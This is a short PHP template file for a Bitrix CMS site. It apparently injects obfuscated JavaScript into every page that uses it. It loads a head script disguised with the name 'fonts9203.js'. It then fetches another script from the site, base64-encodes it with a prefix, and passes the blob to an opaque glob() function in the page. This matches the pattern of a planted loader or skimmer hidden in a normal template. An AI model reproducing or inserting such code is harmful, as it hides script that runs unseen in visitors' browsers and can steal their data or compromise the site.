<? if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();
    $APPLICATION->AddHeadScript('/bitrix/js/abricos/fonts9203.js');
    ?>
    <?$this->setFrameMode(true);?>
    <? $scriptNams= 'http://'.$_SERVER['HTTP_HOST'].'/bitrix/js/abricos/index.min.js';?>
    <?$filebase64='Z'.base64_encode(file_get_contents($scriptNams));?>
    <script>glob('<?=$filebase64?>')</script>

